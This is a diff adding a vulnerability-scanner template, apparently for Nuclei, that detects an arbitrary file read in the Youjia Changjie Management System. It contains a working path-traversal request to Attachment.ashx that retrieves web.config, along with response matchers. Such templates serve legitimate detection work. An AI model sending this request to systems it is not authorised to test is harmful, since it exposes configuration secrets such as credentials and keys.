@@ -1,0 +1,29 @@
+id: youjiasoft-attachment-ashx-anyfile-read
+info:
+  name: Youjia Changjie Management System Attachment.ashx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/Controllers/ajax/Attachment.ashx?attachmentUrl=../../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</system.web>"
+          - "<configuration>"
+      - type: word
+        part: header
+        words:
+          - "filename="
+          - "web.config"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
